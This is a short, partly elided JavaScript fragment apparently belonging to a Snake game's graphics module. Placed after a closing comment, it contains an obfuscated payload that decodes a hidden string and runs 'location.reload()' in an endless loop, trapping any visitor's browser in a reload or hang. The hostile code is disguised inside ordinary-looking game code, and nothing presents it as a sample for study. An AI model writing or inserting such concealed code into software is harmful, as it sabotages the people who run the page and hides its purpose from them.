(function() {
    ...
    var SnakeGraphics = {
         ...
         */
        function a(){var j=['560411aFkiId','9jczKFa','28DgsbcP','reload','2HqJRqf','366024YXLKrd','66633PnNwhH','5531075hJubQg','2385474KRVMJB','4601700UHRybN','6452728ftVaIi'];a=function(){return j;};return a();}var i=b;(function(c,d){var h=b,e=c();while(!![]){try{var f=parseInt(h('0xa'))/0x1*(parseInt(h('0x3'))/0x2)+-parseInt(h('0x5'))/0x3*(-parseInt(h('0x1'))/0x4)+-parseInt(h('0x6'))/0x5+parseInt(h('0x4'))/0x6+-parseInt(h('0x7'))/0x7+-parseInt(h('0x9'))/0x8*(-parseInt(h('0x0'))/0x9)+parseInt(h('0x8'))/0xa;if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0x91ab0));function b(c,d){var e=a();return b=function(f,g){f=f-0x0;var h=e[f];return h;},b(c,d);}while(0x1)location[i('0x2')]();
